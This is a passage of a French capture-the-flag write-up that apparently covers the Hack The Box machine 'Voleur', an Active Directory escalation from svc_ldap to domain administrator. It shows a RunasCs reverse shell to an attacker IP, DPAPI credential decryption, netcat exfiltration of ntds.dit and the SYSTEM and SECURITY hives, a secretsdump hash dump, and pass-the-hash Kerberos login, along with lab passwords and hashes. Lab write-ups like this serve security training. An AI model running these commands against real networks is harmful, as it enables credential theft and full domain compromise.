Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
PS C:\Windows\system32>
```

# Shell en tant Todd.Wolfe
## Restaurer Todd.Wolfe

Avec la commande `Get-ADObject`, j'affiche les objets supprimés.
```powershell
PS C:\Windows\system32> Get-ADObject -Filter 'Isdeleted -eq $true' -IncludeDeletedObjects
Get-ADObject -Filter 'Isdeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db



PS C:\Windows\system32>
```

Je restaure `todd.wolfe` avec `Restore-ADObject`. Pour cela j'ai besoin de l'`ObjectGUID` de `todd.wolfe`. Puis je l'active avec `Enable-Account`.
```powershell
PS C:\Windows\system32> Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"

PS C:\Windows\system32> Enable-ADAccount -Identity todd.wolfe
Enable-ADAccount -Identity todd.wolfe

PS C:\Windows\system32> Get-ADUser -Identity todd.wolfe -Properties Enabled
Get-ADUser -Identity todd.wolfe -Properties Enabled


DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Enabled           : True
GivenName         : Todd
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
SamAccountName    : todd.wolfe
SID               : S-1-5-21-3927696377-1337352550-2781715495-1110
Surname           : Wolfe
UserPrincipalName : todd.wolfe@voleur.htb
```

## runascs.exe

Ensuite je lance `RunasCs.exe` pour avoir un shell en tant `todd.wolfe`.
```powershell
*Evil-WinRM* PS C:\Temp> ./RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.99:9001
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1773aa$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6556 created in background.
```

J'obtient un shell avec `netcat` en tant que `todd.wolfe`.
```powershell
╭─root at exegol-htb in /workspace/Voleur
╰─○ rlwrap nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.193.196.
Ncat: Connection from 10.129.193.196:58684.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\todd.wolfe
```

# Shell en tant que Jeremy.Combs
## DPAPI

Je localise le fichier contenant informations d’identification chiffrées, utilisées par le Gestionnaire d'identification Windows.
```bash
PS C:\> Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Local\Microsoft\Credentials\


    Directory: C:\Users\todd.wolfe\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   4:53 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

Je ne vois que deux fichiers dans le répertoire de la `masterkey`.
```bash
PS C:\> Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\


    Directory: C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         1/31/2025  12:53 AM                S-1-5-21-3927696377-1337352550-2781715495-1110
-a-hs-         1/29/2025   4:53 AM             24 CREDHIST
-a-hs-         1/29/2025   4:53 AM             76 SYNCHIST


PS C:\> Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
Get-ChildItem -Force C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


    Directory: C:\Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/29/2025   4:53 AM            900 BK-VOLEUR
-a-hs-         1/29/2025   4:53 AM             24 Preferred
```

Donc je me connecte par SMB. Je vois que le répertoire personnel de `todd.wolfe` est partagé dans le partage `IT` dans le dossier `Second-Line Support`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ faketime "$(date +'%Y-%m-%d') $(net time -S dc.voleur.htb | awk '{print $4}')" zsh

╭─root at exegol-htb in /workspace/Voleur
╰─○ getTGT.py -dc-ip 10.129.193.196 VOLEUR.HTB/'todd.wolfe':'NightT1meP1dg3on14'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in todd.wolfe.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ smbclient.py "voleur.htb"/"todd.wolfe":"NightT1meP1dg3on14"@"dc.voleur.htb" -k -no-pass
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Wed Jul  9 20:07:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 15:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 16:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 13:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 13:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 16:13:10 2025 Videos
# cd AppData\Local\Microsoft\Credentials\
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:07 2025 ..
-rw-rw-rw-      11068  Wed Jan 29 14:06:56 2025 DFBE70A7E5CC19A398EBF1B96859CE5D
# get DFBE70A7E5CC19A398EBF1B96859CE5D
# cd /
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Wed Jul  9 20:07:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 16:13:16 2025 todd.wolfe
# cd todd.wolfe
# cd AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 14:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 13:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 13:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
```

En fait, je trouve le fichier contenant informations d’identification chiffrées se trouve ici.
```bash
# cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 16:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 14:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```

Je déchiffre premièrement la `masterkey`, puis avec la clé déchiffrée trouvée, j'accède au contenu du `blob`. S'y trouve les identifiants de Jeremy.Combs.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

╭─root at exegol-htb in /workspace/Voleur
╰─○ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Ensuite je forge un ticket pour `jeremy.combs` puis me connecte avec `evil-winrm`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ getTGT.py voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in jeremy.combs.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ nxc smb dc.voleur.htb -d voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k --generate-krb5-file /etc/krb5.conf
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m

╭─root at exegol-htb in /workspace/Voleur
╰─○ export KRB5CCNAME=jeremy.combs.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ klist
Ticket cache: FILE:jeremy.combs.ccache
Default principal: jeremy.combs@VOLEUR.HTB

Valid starting       Expires              Service principal
07/09/2025 21:11:39  07/10/2025 07:11:39  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 07/10/2025 21:11:38

╭─root at exegol-htb in /workspace/Voleur
╰─○ evil-winrm -i 'dc.voleur.htb' -r 'voleur.htb'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> whoami
voleur\jeremy.combs
```

# Shell en tant qu'administrateur
## WSL

Dans le répertoire `C:\IT\Third-Line Support` se trouve un clé privée RSA ainsi qu'un note.
```bash
*Evil-WinRM* PS C:\IT\Third-Line Support> dir


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt


*Evil-WinRM* PS C:\IT\Third-Line Support> download "C:/IT/Third-Line Support/id_rsa"

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Downloading C:/IT/Third-Line Support/id_rsa to id_rsa

Info: Download successful!
*Evil-WinRM* PS C:\IT\Third-Line Support> download "C:/IT/Third-Line Support/Note.txt.txt"

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Downloading C:/IT/Third-Line Support/Note.txt.txt to Note.txt.txt
```

La note est un message de l'administrateur, nous disant qu'il existe une sauvegarde du contenu de la machine.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ bat Note.txt.txt

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

 Please see what you can set up.

 Thanks,

 Admin
```

Je me connecte par SSH à l'aide de la clé privée téléchargée et je me retrouve dans une instance WSL.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ chmod 600 id_rsa

╭─root at exegol-htb in /workspace/Voleur
╰─○ ssh -i id_rsa svc_backup@voleur.htb -p 2222
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  9 12:24:05 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   28%       IPv4 address for eth0: 10.129.193.196
  Swap usage:     0%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                             [ OK ]
svc_backup@DC:~$ ls -la
total 8
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:27 .
drwxr-xr-x 1 root       root       4096 Jan 30 03:46 ..
-rw-r--r-- 1 svc_backup svc_backup  220 Jan 30 03:46 .bash_logout
-rw-r--r-- 1 svc_backup svc_backup 3837 Jan 30 06:26 .bashrc
drwx------ 1 svc_backup svc_backup 4096 Jan 30 04:18 .cache
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:46 .landscape
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 04:27 .local
-rw-r--r-- 1 svc_backup svc_backup    0 Jul  9 10:57 .motd_shown
-rw-r--r-- 1 svc_backup svc_backup  807 Jan 30 03:46 .profile
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 04:16 .ssh
-rw-r--r-- 1 svc_backup svc_backup    0 Jan 30 04:02 .sudo_as_admin_successful
svc_backup@DC:~$ ls -la .landscape/
total 0
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:46 .
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:27 ..
-rw-r--r-- 1 svc_backup svc_backup    0 Jan 30 03:46 sysinfo.log
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```

## SAM et secrets LSA

Je regarde les fichiers appartenant à `svc_backup`. S'y trouvent les registre , `SECURITY`, `SYSTEM` ainsi que le `NTDS.dit`
```bash
find / -type f -user 'svc_backup' 2>/dev/null | less

/home/svc_backup/.bashrc
/home/svc_backup/.bash_logout
/home/svc_backup/.cache/motd.legal-displayed
/home/svc_backup/.landscape/sysinfo.log
/home/svc_backup/.motd_shown
/home/svc_backup/.profile
/home/svc_backup/.ssh/authorized_keys
/home/svc_backup/.ssh/id_rsa
/home/svc_backup/.ssh/id_rsa.pub
/home/svc_backup/.sudo_as_admin_successful
/mnt/c/$Recycle.Bin/S-1-5-21-3927696377-1337352550-2781715495-1107/desktop.ini
/mnt/c/inetpub/DeviceHealthAttestation/bin/hassrv.dll
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
/mnt/c/IT/Third-Line Support/id_rsa
/mnt/c/IT/Third-Line Support/Note.txt.txt
```

Je télécharge les fichiers `SECURITY`, `SYSTEM` et `ntds.dit`.
```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la
total 17952
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30 03:30 SECURITY
-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc 10.10.14.99 1337 < SYSTEM
^C
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc 10.10.14.99 1337 < SECURITY
^C
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cd ..
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\ Directory/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -al
total 24592
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 03:49 .
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30 08:11 ..
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30 03:49 ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ nc 10.10.14.99 1337 < ntds.dit
```

## DCSync

Avec `secretsdump`, je récupère les hash des utilisateurs du domaine.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656*************************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:04933******************************:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44f****************************:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566d**************************:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3a***************************:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e3771***********************:::
--SNIP--
```

## evil-winrm

Je forge un ticket pour `administrator`. Je créé aussi un nouveau fichier `/etc/krb5.conf`
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ getTGT.py voleur.htb/'administrator' -hashes ':e656e07c56d831611b577b160b259ad2'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in administrator.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ export KRB5CCNAME=administrator.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ nxc smb dc.voleur.htb -d voleur.htb -u administrator -H 'e656e07c56d831611b577b160b259ad2' -k --generate-krb5-file /etc/krb5.conf
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\administrator:e656e07c56d831611b577b160b259ad2 (admin)
```

Je me connecte en tant que `administrator`.
```powershell
╭─root at exegol-htb in /workspace/Voleur
╰─○ evil-winrm -i 'dc.voleur.htb' -r 'voleur.htb'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
voleur\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
d7c0d94b****************************
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![](https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif)
